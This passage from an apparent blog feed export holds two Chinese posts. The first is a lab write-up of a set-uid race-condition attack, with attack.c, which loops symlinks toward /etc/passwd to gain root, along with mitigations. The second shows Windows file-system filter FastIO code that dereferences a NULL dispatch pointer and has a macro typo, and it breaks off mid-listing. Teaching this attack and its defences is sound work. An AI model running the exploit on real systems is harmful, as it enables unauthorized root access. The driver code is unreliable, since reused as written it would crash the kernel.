alt="image-20240209211251740"></p><ul><li>rootfile属主是root，是我们要修改的目标文件。</li><li>testfile属主是test，用来确保通过access()函数的权限检查</li><li>vulp是set-uid程序属主是root，是存在竞态条件漏洞的程序</li><li>contents_to_append属主是test，是我们要向rootfile追加的内容，可以任意修改</li><li>check.sh属主是test，用来反复执行vulp程序并且确保rootfile只修改一次。</li></ul><p>登录实验机，切换到test用户。查看rootfile文件夹，为空。</p><p><img src="/.io//image-20240209211509107.png" alt="image-20240209211509107"></p><p>在执行vulp程序之前，先运行我们的attack程序。</p><p><img src="/.io//image-20240209211534745.png" alt="image-20240209211534745"></p><p>运行check.sh，耐心等待攻击过程完成。</p><p><img src="/.io//image-20240209211834214.png" alt="image-20240209211834214"></p><p>当check.sh结束并打印stop…the root file has been changed时，攻击完成。</p><p>此时cat rootfile，发现写入新内容。可以killall attack关闭程序。</p><h2 id="保护方法"><a href="#保护方法" class="headerlink" title="保护方法"></a>保护方法</h2><p>保护机制A：重复检查权限。想要避免竞态条件的发生并不容易，先检查再访问这个模式在很多程序中都是存在。比起想办法移除漏洞，不如换个思路，我们可以增加更多的竞态条件，这样就能减小攻击者攻击成功的概率了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="built_in">access</span>(fn, W_OK))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">access</span>(fn, W_OK))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*嵌套n层*/</span></span><br><span class="line"></span><br><span class="line">        fp = <span class="built_in">fopen</span>(fn, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fwrite</span>(<span class="string">&quot;\n&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">char</span>), <span class="number">1</span>, fp);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fwrite</span>(buffer, <span class="built_in">sizeof</span>(<span class="type">char</span>), <span class="built_in">strlen</span>(buffer), fp);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">fclose</span>(fp);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;No permission \n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;No permission \n&quot;</span>);</span><br></pre></td></tr></table></figure><p>保护机制B：最小权限原则 该程序的根本问题就在于它违反了最小权限原则，程序员认识到运行这个程序的用户可能权利过大，所以引入access函数进行限制，但也同时引入了竞态条件的隐患。更好的方法是使用seteuid系统调用暂时禁止root权限，当需要时再恢复。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> * fn = <span class="string">&quot;/tmp/XYZ&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> buffer[<span class="number">60</span>];</span><br><span class="line"></span><br><span class="line">        FILE *fp;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* get user input */</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%50s&quot;</span>, buffer );</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">        <span class="type">uid_t</span> euid = <span class="built_in">geteuid</span>();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">seteuid</span>(<span class="built_in">getuid</span>());</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fp = <span class="built_in">fopen</span>(fn, <span class="string">&quot;a+&quot;</span>))&#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">fwrite</span>(<span class="string">&quot;\n&quot;</span>, <span class="built_in">sizeof</span>(<span class="type">char</span>), <span class="number">1</span>, fp);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">fwrite</span>(buffer, <span class="built_in">sizeof</span>(<span class="type">char</span>), <span class="built_in">strlen</span>(buffer), fp);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">fclose</span>(fp);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;No permission \n&quot;</span>);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">        <span class="built_in">seteuid</span>(euid);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>使用test用户利用此漏洞获取root权限：</p><p>利用漏洞在 &#x2F;etc&#x2F;passwd 和 &#x2F;etc&#x2F;shadow 后追加信息。这两个文件是unix做用户授权用的，攻击者有可能利用这点创建用户，甚至是超级用户。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* attack.c */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">unlink</span>(<span class="string">&quot;/tmp/XYZ&quot;</span>);</span><br><span class="line">        <span class="built_in">symlink</span>(<span class="string">&quot;/dev/null&quot;</span>,<span class="string">&quot;/tmp/XYZ&quot;</span>);</span><br><span class="line">        <span class="built_in">usleep</span>(<span class="number">1000</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">unlink</span>(<span class="string">&quot;/tmp/XYZ&quot;</span>);</span><br><span class="line">        <span class="built_in">symlink</span>(<span class="string">&quot;/etc/passwd&quot;</span>,<span class="string">&quot;/tmp/XYZ&quot;</span>);</span><br><span class="line">        <span class="built_in">usleep</span>(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//gcc attack.c -o attack</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>过滤FastIO</title>
      <link href="/2024/03/09/%E8%BF%87%E6%BB%A4FastIO/"/>
      <url>/2024/03/09/%E8%BF%87%E6%BB%A4FastIO/</url>
      
        <content type="html"><![CDATA[<h1 id="过滤FastIO"><a href="#过滤FastIO" class="headerlink" title="过滤FastIO"></a>过滤FastIO</h1><p>过滤驱动就是挂载在一般驱动，比如磁盘驱动上，拦截IRP、FastIO请求，并有选择的过滤。</p><p>FastIO和IRP类似，一般比IRP要复杂，如果对FastIO全部拒绝，可以让驱动走IRP，这也是一般的过滤方法。</p><p><a href="https://zhuanlan.zhihu.com/p/651420427">遍历FSD驱动派遣函数与Hook检测 - 知乎 (zhihu.com)</a></p><p>FSD(File System Drivers)位于系统底层，是和磁盘驱动最近的地方。它平时存在感不强，但由于本身身处要地，所以经常被各种恶意程序、安全软件以及其他怀有各种纯洁和不纯洁目的的应用盯上。</p><h2 id="初始化FastIO派遣例程"><a href="#初始化FastIO派遣例程" class="headerlink" title="初始化FastIO派遣例程"></a>初始化FastIO派遣例程</h2><p>在wdm中有对FAST_IO_DISPATCH的定义，申请一个这样的结构，并填充其中的内容</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">InitializeFastIo</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    FAST_IO_DISPATCH** FastIoDispatch)</span>   <span class="comment">//这是一个二维指针  </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//申请一个结构指针</span></span><br><span class="line">    FAST_IO_DISPATCH* v5 = <span class="literal">NULL</span>;</span><br><span class="line">    v5 = (PFAST_IO_DISPATCH)<span class="built_in">ExAllocatePool</span>(NonPagedPool, <span class="built_in">sizeof</span>(FAST_IO_DISPATCH));</span><br><span class="line">    <span class="keyword">if</span> (v5 == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>(v5, <span class="built_in">sizeof</span>(FAST_IO_DISPATCH));</span><br><span class="line">    v5-&gt;SizeOfFastIoDispatch = <span class="built_in">sizeof</span>(FAST_IO_DISPATCH);</span><br><span class="line">    v5-&gt;FastIoCheckIfPossible = FastIoCheckIfPossible;</span><br><span class="line">    v5-&gt;FastIoRead = FastIoRead;</span><br><span class="line">    v5-&gt;FastIoWrite = FastIoWrite;</span><br><span class="line">    v5-&gt;FastIoQueryBasicInfo = FastIoQueryBasicInfo;</span><br><span class="line">    v5-&gt;FastIoQueryStandardInfo = FastIoQueryStandardInfo;</span><br><span class="line">    v5-&gt;FastIoLock = FastIoLock;</span><br><span class="line">    v5-&gt;FastIoUnlockSingle = FastIoUnlockSingle;</span><br><span class="line">    v5-&gt;FastIoUnlockAll = FastIoUnlockAll;</span><br><span class="line">    v5-&gt;FastIoUnlockAllByKey = FastIoUnlockAllByKey;</span><br><span class="line">    v5-&gt;FastIoDeviceControl = FastIoDeviceControl;</span><br><span class="line">    v5-&gt;FastIoDetachDevice = FastIoDetachDevice;</span><br><span class="line">    v5-&gt;FastIoQueryNetworkOpenInfo = FastIoQueryNetworkOpenInfo;</span><br><span class="line">    v5-&gt;MdlRead = FastIoMdlRead;</span><br><span class="line">    v5-&gt;MdlReadComplete = FastIoMdlReadComplete;</span><br><span class="line">    v5-&gt;PrepareMdlWrite = FastIoPrepareMdlWrite;</span><br><span class="line">    v5-&gt;MdlWriteComplete = FastIoMdlWriteComplete;</span><br><span class="line">    v5-&gt;FastIoReadCompressed = FastIoReadCompressed;</span><br><span class="line">    v5-&gt;FastIoWriteCompressed = FastIoWriteCompressed;</span><br><span class="line">    v5-&gt;MdlReadCompleteCompressed = FastIoMdlReadCompleteCompressed;</span><br><span class="line">    v5-&gt;MdlWriteCompleteCompressed = FastIoMdlWriteCompleteCompressed;</span><br><span class="line">    v5-&gt;FastIoQueryOpen = FastIoQueryOpen;</span><br><span class="line"></span><br><span class="line">    *FastIoDispatch = v5;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="FastIO派遣例程成员"><a href="#FastIO派遣例程成员" class="headerlink" title="FastIO派遣例程成员"></a>FastIO派遣例程成员</h2><p>首先判断设备对象是否是我们的设备对象，且不对控制设备对象处理。调用绑定的对应函数，这里自身直接返回FALSE。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOLEAN <span class="title">FastIoCheckIfPossible</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    PLARGE_INTEGER FileOffset,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG Length,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOLEAN Wait,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG LockKey,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOLEAN CheckForReadOperation,</span></span></span><br><span class="line"><span class="params"><span class="function">    PIO_STATUS_BLOCK IoStatus,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">   BOOLEAN IsOk = FALSE;</span><br><span class="line">   PDEVICE_EXTENSION DeviceExtension = <span class="literal">NULL</span>;</span><br><span class="line">   PFAST_IO_DISPATCH FastIoDispatch = <span class="literal">NULL</span>;  <span class="comment">//指针数组的数组名</span></span><br><span class="line">   PDEVICE_OBJECT    v2 = <span class="literal">NULL</span>;    <span class="comment">//????????????????????????????????????????????</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">//判断设备对象是否是我们的设备对象</span></span><br><span class="line">   <span class="keyword">if</span> (!<span class="built_in">IsOurDeviceObject</span>(DeviceObject))</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">goto</span> Exit;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">//我们要获得钩子函数</span></span><br><span class="line">   DeviceExtension = (PDEVICE_EXTENSION)DeviceObject-&gt;DeviceExtension;</span><br><span class="line">   v2 = DeviceExtension-&gt;pFSDeviceObject;  <span class="comment">//FSD设备对象</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (<span class="built_in">IsControlDeviceObject</span>(DeviceObject) == TRUE)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">goto</span> Exit;   <span class="comment">//如果是控制设备对象</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(FastIoDispatch-&gt;FastIoCheckIfPossible == <span class="literal">NULL</span>)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">goto</span> Exit;</span><br><span class="line">   &#125;   </span><br><span class="line">   <span class="keyword">if</span> (v2 == <span class="literal">NULL</span> || v2-&gt;DriverObject == <span class="literal">NULL</span>)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">goto</span> Exit;</span><br><span class="line">   &#125;</span><br><span class="line">   FastIoDispatch = v2-&gt;DriverObject-&gt;FastIoDispatch;</span><br><span class="line">   <span class="keyword">if</span> (FastIoDispatch == <span class="literal">NULL</span>)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="keyword">goto</span> Exit;</span><br><span class="line">   &#125;</span><br><span class="line">   IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoCheckIfPossible</span>(</span><br><span class="line">        FileObject,</span><br><span class="line">        FileOffset,</span><br><span class="line">        Length,</span><br><span class="line">        Wait,</span><br><span class="line">        LockKey,</span><br><span class="line">        CheckForReadOperation,</span><br><span class="line">        IoStatus,</span><br><span class="line">        v2);</span><br><span class="line"></span><br><span class="line">Exit:</span><br><span class="line">    <span class="keyword">return</span> IsOk;   </span><br><span class="line">    <span class="comment">//如果返回false报废当前FastIo请求 执行Irp请求</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以抽出FastIO开始和结束部分</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> BEGIN_FAST_IO\</span></span><br><span class="line"><span class="meta">    PDEVICE_EXTENSION DeviceExtension = NULL;\</span></span><br><span class="line"><span class="meta">    PDEVICE_OBJECT v2 = NULL;\</span></span><br><span class="line"><span class="meta">    PFAST_IO_DISPATCH FastIoDispatch = NULL;\</span></span><br><span class="line"><span class="meta">    BOOLEANIsOk = FALSE;\</span></span><br><span class="line"><span class="meta">    \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (!IsOurDeviceObject(DeviceObject))\</span></span><br><span class="line"><span class="meta">    goto Exit;\</span></span><br><span class="line"><span class="meta">    \</span></span><br><span class="line"><span class="meta">    DeviceExtension = (PDEVICE_EXTENSION)DeviceObject-&gt;DeviceExtension;\</span></span><br><span class="line"><span class="meta">    v2 = DeviceExtension-&gt;pFSDeviceObject;\</span></span><br><span class="line"><span class="meta">    \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (IsControlDeviceObject(DeviceObject) == TRUE)\</span></span><br><span class="line"><span class="meta">    goto Exit;\</span></span><br><span class="line"><span class="meta">    \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (v2 == NULL || v2-&gt;DriverObject == NULL)\</span></span><br><span class="line"><span class="meta">    goto Exit;\</span></span><br><span class="line"><span class="meta">    \</span></span><br><span class="line"><span class="meta">    FastIoDispatch = v2-&gt;DriverObject-&gt;FastIoDispatch;\</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (FastIoDispatch == NULL)\</span></span><br><span class="line"><span class="meta">    goto Exit;\</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> END_FAST_IO\</span></span><br><span class="line"><span class="meta">Exit:\</span></span><br><span class="line"><span class="meta">    return IsOk;\</span></span><br></pre></td></tr></table></figure><p>给出余下的FastIO派遣例程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span 